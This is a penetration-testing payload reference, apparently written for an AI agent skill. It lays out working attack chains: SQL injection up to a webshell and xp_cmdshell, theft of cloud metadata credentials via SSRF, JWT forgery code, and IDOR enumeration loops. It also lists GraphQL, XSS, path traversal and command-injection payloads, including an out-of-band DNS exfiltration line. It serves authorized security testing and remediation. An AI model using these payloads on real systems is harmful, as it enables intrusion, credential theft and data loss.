# Attack Patterns and Payload Reference

Concrete attack chains and example payloads referenced from the main SKILL.md (Static Analysis, API Security Testing, Web Vulnerability Testing) and from `owasp_top_10_checklist.md`. All payloads are for use only against systems you have written authorization to test, ideally in an isolated lab or staging environment before touching anything closer to production.

---

## 1. SQL Injection → Remote Code Execution

A full attack chain, not just a single payload — this is what "SQLi" actually leads to when unremediated.

**Step 1 — Confirm the injection point (error-based):**

```
GET /products?id=1' 
```
A DB error in the response (`SQL syntax error near '''`) confirms unsanitized input reaches the query.

**Step 2 — Confirm boolean-based blind if errors are suppressed:**

```
id=1 AND 1=1   -> normal response
id=1 AND 1=2   -> different/empty response
```

**Step 3 — Confirm time-based blind if no observable difference:**

```
MySQL:      id=1 AND SLEEP(5)
MSSQL:      id=1; WAITFOR DELAY '0:0:5'--
PostgreSQL: id=1 AND (SELECT pg_sleep(5))
Oracle:     id=1 AND DBMS_LOCK.SLEEP(5)=1
```
A 5-second response delay confirms blind injection.

**Step 4 — Enumerate the database (union-based, MySQL example):**

```
id=-1 UNION SELECT NULL,NULL,NULL--
id=-1 UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
id=-1 UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
id=-1 UNION SELECT username,password,NULL FROM users--
```

**Step 5 — Escalate to file/OS access (MySQL with FILE privilege, common misconfig):**

```
-- Read a file:
id=-1 UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--

-- Write a webshell if secure_file_priv is not set and the web root is writable:
id=-1 UNION SELECT '<?php system($_GET["c"]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'--
```

**Step 6 — RCE via webshell:**

```
GET /shell.php?c=id
```
This completes the chain: unsanitized input → data exfiltration → arbitrary file write → remote code execution. In MSSQL environments, the equivalent escalation path is `xp_cmdshell`:

```
id=1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
id=1; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
id=1; EXEC xp_cmdshell 'whoami';
```

**Impact framing for the report:** "SQL injection in `/products?id=` allows unauthenticated database enumeration and, given MySQL FILE privileges observed in this configuration, escalates to remote code execution via webshell upload." CVSS 3.1: `AV:N/AC:L/PR:N/UI:N/S:C/I:H/C:H/A:H` (~10.0 given scope change to OS).

---

## 2. SSRF → Cloud Metadata Credential Theft

The most common high-impact SSRF chain in cloud-hosted apps.

**Step 1 — Find a server-side fetch feature:** URL preview/unfurl, webhook configuration, "import from URL," PDF/screenshot renderers, image proxy endpoints.

**Step 2 — Redirect the fetch to the cloud metadata service:**

```
AWS (IMDSv1):
POST /api/import { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
-> returns role name, e.g. "prod-app-role"
POST /api/import { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-app-role" }
-> returns {"AccessKeyId":"...","SecretAccessKey":"...","Token":"...","Expiration":"..."}

GCP:
GET http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
Header required: "Metadata-Flavor: Google"
-> If the app's fetch logic forwards custom headers, chain a header-injection SSRF to add this.

Azure:
GET http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Header required: "Metadata: true"
```

**Step 3 — Bypass naive `127.0.0.1`/`localhost` blocklists if present:**

```
Decimal IP:      http://2852039166/            (= 169.254.169.254)
Hex IP:          http://0xA9FEA9FE/
IPv6-mapped:     http://[::ffff:169.254.169.254]/
Short-form:      http://169.254.169.254.xip.io/   (wildcard DNS resolving to the target)
Open redirect:   http://trusted-domain.com/redirect?to=http://169.254.169.254/latest/meta-data/
DNS rebinding:   attacker-controlled domain resolving to a public IP at validation time,
                 then to 169.254.169.254 at request time (requires low DNS TTL)
```

**Step 4 — Use stolen credentials:**

```bash
export AWS_ACCESS_KEY_ID=<stolen>
export AWS_SECRET_ACCESS_KEY=<stolen>
export AWS_SESSION_TOKEN=<stolen>
aws sts get-caller-identity
aws s3 ls   # enumerate what the compromised role can reach
```

**Impact framing:** "SSRF in the URL-import feature allows retrieval of the instance's IAM role credentials, enabling access to any AWS resource that role is permitted to reach." Recommend IMDSv2 (session-token-required, defeats simple SSRF-based retrieval) plus network-layer egress filtering as remediation. CVSS ~9.1–9.8 depending on the reached role's permissions.

---

## 3. JWT Algorithm Confusion and Manipulation

**Attack A — `alg: none`:**

```
Original header:  {"alg":"HS256","typ":"JWT"}
Modified header:  {"alg":"none","typ":"JWT"}
```
Base64url-encode the modified header and original payload, join with `.`, and submit with an empty third segment: `<header>.<payload>.`
Some poorly configured libraries accept this and treat the token as valid without any signature check.

**Attack B — RS256 → HS256 key confusion:**

If the server verifies RS256 tokens using the public key, and the verification code path also accepts HS256, an attacker can:
1. Obtain the server's RSA public key (often published at a JWKS endpoint, or embedded in the app).
2. Forge a new token with `alg: HS256`, using the **public key** as the HMAC secret:

```python
import jwt
public_key = open("server_public_key.pem").read()
forged = jwt.encode({"user":"admin","role":"admin"}, public_key, algorithm="HS256")
```
3. If the server's verification logic does `jwt.decode(token, key, algorithms=["RS256","HS256"])` without pinning the expected algorithm, it will verify the HMAC signature using the public key string as the secret — succeeding.

**Attack C — Claim tampering with a leaked/weak secret:**

```bash
# Brute-force a weak HS256 secret offline
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
```
If the secret is guessable (`secret`, `changeme`, company name), forge any claims: `{"sub":"1","role":"admin","exp":9999999999}`.

**Attack D — `kid` header injection (JWKS/path confusion):**

```
{"alg":"HS256","kid":"../../../../dev/null"}
```
If the server reads the key from a file path derived from the unsanitized `kid` claim, pointing it at `/dev/null` (empty key) lets the attacker sign with an empty string as the HMAC secret.

**Remediation:** Pin the expected algorithm explicitly server-side (never accept an algorithm list that mixes symmetric and asymmetric), reject `alg: none` unconditionally, never derive key material or file paths from unsanitized token headers, use short-lived tokens with rotation and a strong random secret (32+ bytes) for HS256.

---

## 4. IDOR / BOLA Enumeration

**Step 1 — Baseline as an authenticated low-privilege user:**

```
GET /api/orders/1042
Authorization: Bearer <user_A_token>
-> 200 OK {"order_id":1042,"user_id":55,...}
```

**Step 2 — Swap the identifier to an adjacent value, same token:**

```
GET /api/orders/1043
Authorization: Bearer <user_A_token>
-> If 200 OK with another user's order data: confirmed IDOR
```

**Step 3 — Automate enumeration to establish scope/impact (authorized engagements only):**

```bash
for id in $(seq 1000 1100); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN" \
    "https://target.com/api/orders/$id")
  echo "$id: $code"
done
```
A consistent `200` across a range of IDs belonging to other users confirms broad exposure, not a one-off.

**Step 4 — Test write/delete, not just read:**

```
PUT /api/orders/1043 {"shipping_address":"attacker-controlled"}
DELETE /api/orders/1043
```
Read-only IDOR checks routinely miss write/delete IDOR — always test the full CRUD surface per endpoint.

**Step 5 — Test IDOR via indirect references too:** GUIDs/UUIDs are not inherently safe if they're leaked elsewhere (e.g., visible in another user's shared link, or sequential-looking despite being "random").

**Impact framing:** Quantify with an enumeration count ("43 of 100 sequential order IDs returned another customer's PII") rather than a single anecdote — this materially changes severity and remediation urgency.

---

## 5. Mass Assignment / BFLA Combo

```
POST /api/users/55/update
{"name":"Alice","email":"alice@example.com"}

Add privileged fields not exposed in the UI:
{"name":"Alice","email":"alice@example.com","role":"admin","is_verified":true,"account_balance":999999}
```
If the API blindly binds the request body to the model, previously non-editable privileged fields become attacker-controlled. Combine with a BFLA test (calling `/api/admin/users` as a non-admin) to check if the elevated `role` field then unlocks admin functionality.

---

## 6. GraphQL-Specific Attacks

**Introspection (should be disabled in production):**

```
POST /graphql
{"query":"{ __schema { types { name fields { name } } } }"}
```
A full schema dump in the response is itself a finding (attack-surface disclosure) even before further exploitation.

**Query depth / resource-exhaustion attack:**

```graphql
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends { name }
        }
      }
    }
  }
}
```
Deeply nested or circular queries can exhaust server resources — a GraphQL-specific denial-of-service vector absent query-depth limiting.

**Batch query bypass of per-request rate limiting:**

```graphql
[
  {"query": "mutation { login(user:\"a\",pass:\"guess1\") { token } }"},
  {"query": "mutation { login(user:\"a\",pass:\"guess2\") { token } }"},
  {"query": "mutation { login(user:\"a\",pass:\"guess3\") { token } }"}
]
```
Sending a batch array as one HTTP request often evades rate limiters keyed on request count rather than operation count — enabling brute force at scale.

---

## 7. XSS Filter Bypasses (context-specific)

```
Basic reflected:      <script>alert(document.domain)</script>
Filter bypass (no <script>): <img src=x onerror=alert(1)>
SVG vector:           <svg onload=alert(1)>
Attribute-context:    "><script>alert(1)</script>
                       " autofocus onfocus=alert(1) x="
JS-string-context:    '-alert(1)-'
                       ';alert(1);//
Event-handler filter bypass:  <details open ontoggle=alert(1)>
DOM-based sink (innerHTML fed by location.hash):
                       https://target.com/#<img src=x onerror=alert(document.cookie)>
```

---

## 8. Path Traversal

```
Basic:            ../../../../etc/passwd
URL-encoded:      ..%2f..%2f..%2f..%2fetc%2fpasswd
Double-encoded:   ..%252f..%252f..%252fetc%252fpasswd
Null-byte legacy: ../../../etc/passwd%00.png
Windows target:   ..\..\..\..\windows\win.ini
```

---

## 9. Command Injection

```
Direct:        ; id
Pipe:          | whoami
Subshell:      $(whoami)
Backtick:      `id`
Blind (time):  ; sleep 5
Blind (OOB DNS): ; nslookup $(whoami).<your-collaborator-domain>
```

---

## Notes on Responsible Use

Every payload above should be executed only within written scope, ideally with a proof-of-concept limited to demonstrating impact (e.g., `SELECT version()` rather than dumping a full users table; `id` rather than establishing a persistent shell). See `responsible_disclosure.md` for what happens after you confirm a finding.
